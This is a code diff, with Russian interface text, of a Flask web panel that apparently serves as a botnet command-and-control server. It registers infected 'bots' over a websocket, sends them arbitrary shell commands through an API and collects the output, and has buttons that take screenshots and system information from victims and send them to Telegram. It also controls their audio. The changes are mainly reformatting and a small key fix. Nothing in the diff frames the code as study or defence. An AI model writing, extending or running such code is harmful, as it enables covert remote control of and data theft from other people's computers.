@@ -68,7 +68,7 @@ HTML_TEMPLATE = """
             <div class="control-block"><h3>Фонотека</h3><div class="audio-list" id="audio_list"></div></div>
             <div class="control-block"><h3>Выполнение команд</h3><input type="text" id="command_input" placeholder="Введите команду..."><button onclick="sendShellCommand('command_input')">Отправить</button></div>
             <div class="control-block"><h3>Управление звуком</h3><label for="volume_slider">Громкость:</label><br><input type="range" id="volume_slider" min="0" max="100" value="50" oninput="sendControlCommand('setvolume ' + this.value)"><output id="volume_output">50%</output><br><br><button onclick="sendControlCommand('mute')">Mute</button><button onclick="sendControlCommand('unmute')">Unmute</button></div>
-            <div class="control-block"><h3>Специальные команды</h3>;<button onclick="sendShellCommand('sysinfo')">Получить инфо (в Telegram)</button><button onclick="sendControlCommand('screenshot')">Сделать скриншот (в Telegram)</button></div>
+            <div class="control-block"><h3>Специальные команды</h3><button onclick="sendShellCommand('sysinfo')">Получить инфо (в Telegram)</button><button onclick="sendControlCommand('screenshot')">Сделать скриншот (в Telegram)</button></div>
             <div class="control-block"><h3>Результат последней команды</h3><pre id="result_output_pre">Ожидание команды...</pre></div>
         {% else %}
             <p>Нет активных ботов.</p>
@@ -104,7 +104,8 @@ HTML_TEMPLATE = """
                 mainBotSelect.appendChild(opt);
             });
 
-            const savedBotId = localStorage.getItem('selectedBotId');       if (savedBotId && BOTS[savedBotId]) {
+            const savedBotId = localStorage.getItem('selectedBotId');
+            if (savedBotId && BOTS[savedBotId]) {
                 mainBotSelect.value = savedBotId;
             }
 
@@ -180,17 +181,22 @@ HTML_TEMPLATE = """
 </html>
 """
 
-# ... (весь остальной бэкенд-код остается без изменений) ...
-@app.route('/api/get_file_lists')
-def get_file_lists(): return jsonify({'audio': audio_files, 'images': image_files})
-@app.route('/')
-def index(): bots_for_template = {ip: {'hostname': data['hostname'],'alias': data['alias']} for ip, data in bots.items()}; return render_template_string(HTML_TEMPLATE, bots_list=list(bots.keys()), bots_data=bots_for_template, image_files=image_files, audio_files=audio_files)
 @app.route('/files/<folder>/<filename>')
 def serve_files(folder, filename):
     directory = AUDIO_DIR if folder == 'audio' else IMAGE_DIR if folder == 'image' else None
     if directory and os.path.exists(os.path.join(directory, filename)):
         return send_from_directory(directory, filename)
     return "Not Found", 404
+
+@app.route('/api/get_file_lists')
+def get_file_lists():
+    return jsonify({'audio': audio_files, 'image': image_files}) # Исправлено 'images' на 'image'
+
+@app.route('/')
+def index():
+    bots_for_template = {ip: {'hostname': data['hostname'],'alias': data['alias']} for ip, data in bots.items()}
+    return render_template_string(HTML_TEMPLATE, bots_list=list(bots.keys()), bots_data=bots_for_template, image_files=image_files, audio_files=audio_files)
+
 @app.route('/api/rename', methods=['POST'])
 def api_rename():
     data = request.get_json()
@@ -203,56 +209,91 @@ def api_rename():
             bots[bot_id]['alias'] = new_alias
         return jsonify({'status': 'ok'})
     return jsonify({'status': 'error', 'message': 'Invalid request'}), 400
+
 @app.route('/api/shell_command', methods=['POST'])
 def api_shell_command():
-    data = request.get_json(); bot_id, cmd = data.get('bot_id'), data.get('command')
-    if not (bot_id and cmd and bot_id in bots): return jsonify({'status': 'error', 'message': 'Неверный запрос.'}), 400
+    data = request.get_json()
+    bot_id = data.get('bot_id')
+    cmd = data.get('command')
+    if not (bot_id and cmd and bot_id in bots):
+        return jsonify({'status': 'error', 'message': 'Неверный запрос.'}), 400
     try:
-        ws = bots[bot_id]['ws'];
-        if bot_id in command_results: del command_results[bot_id]
+        ws = bots[bot_id]['ws']
+        if bot_id in command_results:
+            del command_results[bot_id]
         ws.send(cmd)
         for _ in range(600):
-            if bot_id in command_results: return jsonify({'status': 'ok', 'result': command_results.pop(bot_id)})
+            if bot_id in command_results:
+                return jsonify({'status': 'ok', 'result': command_results.pop(bot_id)})
             time.sleep(0.1)
         return jsonify({'status': 'error', 'message': 'Бот не ответил за 60 секунд.'}), 408
-    except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
 @app.route('/api/control', methods=['POST'])
 def api_control():
-    data = request.get_json(); bot_id, cmd = data.get('bot_id'), data.get('command')
-    if not (bot_id and cmd and bot_id in bots): return jsonify({'status': 'error', 'message': 'Неверный запрос или бот не найден'}), 400
-    try: bots[bot_id]['ws'].send(cmd); return jsonify({'status': 'ok'})
-    except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
+    data = request.get_json()
+    bot_id = data.get('bot_id')
+    cmd = data.get('command')
+    if not (bot_id and cmd and bot_id in bots):
+        return jsonify({'status': 'error', 'message': 'Неверный запрос или бот не найден'}), 400
+    try:
+        bots[bot_id]['ws'].send(cmd)
+        return jsonify({'status': 'ok'})
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
 @app.route('/api/get_volume', methods=['POST'])
 def api_get_volume():
     bot_id = request.json.get('bot_id')
-    if not (bot_id and bot_id in bots): return jsonify({'status': 'not_found'}), 404
+    if not (bot_id and bot_id in bots):
+        return jsonify({'status': 'not_found'}), 404
     try:
-        events[bot_id] = threading.Event(); bots[bot_id]['ws'].send('getvolume')
-        if events[bot_id].wait(timeout=3): return jsonify({'status': 'ok', 'volume': volume_levels.get(bot_id, 50)})
-        else: return jsonify({'status': 'timeout'}), 408
-    except Exception as e: return jsonify({'status': 'error', 'message': str(e)}), 500
+        events[bot_id] = threading.Event()
+        bots[bot_id]['ws'].send('getvolume')
+        if events[bot_id].wait(timeout=3):
+            return jsonify({'status': 'ok', 'volume': volume_levels.get(bot_id, 50)})
+        else:
+            return jsonify({'status': 'timeout'}), 408
+    except Exception as e:
+        return jsonify({'status': 'error', 'message': str(e)}), 500
+
 @sock.route('/ws')
 def websocket_handler(ws):
     bot_ip = ws.environ.get('HTTP_X_FORWARDED_FOR', ws.environ.get('REMOTE_ADDR', 'unknown_ip'))
     try:
         first_message = ws.receive(timeout=10)
-        if first_message.startswith("HOSTNAME:"): hostname = first_message.split(":", 1)[1]
-        else: hostname = "unknown_host"
-    except Exception: hostname = "timeout_host"; ws.close(); return
-    bots[bot_ip] = {'ws': ws, 'hostname': hostname, 'alias': aliases.get(bot_ip, '')}; ws_map[ws] = bot_ip
+        if first_message.startswith("HOSTNAME:"):
+            hostname = first_message.split(":", 1)[1]
+        else:
+            hostname = "unknown_host"
+    except Exception:
+        hostname = "timeout_host"
+        ws.close()
+        return
+
+    bots[bot_ip] = {'ws': ws, 'hostname': hostname, 'alias': aliases.get(bot_ip, '')}
+    ws_map[ws] = bot_ip
     print(f"[+] Новый бот: {bot_ip} ({hostname})")
     try:
         while True:
-            result = ws.receive(); current_bot_ip = ws_map.get(ws)
-            if not current_bot_ip: continue
+            result = ws.receive()
+            current_bot_ip = ws_map.get(ws)
+            if not current_bot_ip:
+                continue
             if result.startswith('VOL_LEVEL:'):
                 level_str = result.split(':')[1]
-                if level_str.isdigit(): volume_levels[current_bot_ip] = int(level_str)
-                if current_bot_ip in events and not events[current_bot_ip].is_set(): events[current_bot_ip].set()
-            else: command_results[current_bot_ip] = result
+                if level_str.isdigit():
+                    volume_levels[current_bot_ip] = int(level_str)
+                if current_bot_ip in events and not events[current_bot_ip].is_set():
+                    events[current_bot_ip].set()
+            else:
+                command_results[current_bot_ip] = result
     except Exception:
         dead_bot_ip = ws_map.pop(ws, None)
-        if dead_bot_ip and dead_bot_ip in bots: del bots[dead_bot_ip]
+        if dead_bot_ip and dead_bot_ip in bots:
+            del bots[dead_bot_ip]
         print(f"[-] Бот {dead_bot_ip or 'unknown'} отвалился.")
+
 if __name__ == '__main__':
     print("Этот скрипт не предназначен для прямого запуска.")
